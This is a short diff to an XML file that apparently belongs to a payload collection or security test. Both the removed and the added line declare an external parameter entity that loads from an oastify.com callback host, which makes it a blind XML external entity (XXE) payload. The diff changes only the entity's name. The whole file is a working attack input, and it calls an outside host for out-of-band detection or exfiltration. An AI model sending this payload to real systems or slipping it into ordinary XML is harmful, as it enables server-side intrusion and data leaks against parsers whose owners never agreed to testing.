@@ -1,5 +1,5 @@
 <?xml version="1.0" ?>
 <!DOCTYPE root [
-<!ENTITY % ext SYSTEM "http://b6iia9g2za68c0feu98jh3r20t6ju8.oastify.com/Blind_xxe"> %ext;
+<!ENTITY % token SYSTEM "http://b6iia9g2za68c0feu98jh3r20t6ju8.oastify.com/Blind_xxe"> %token;
 ]>
 <r></r>
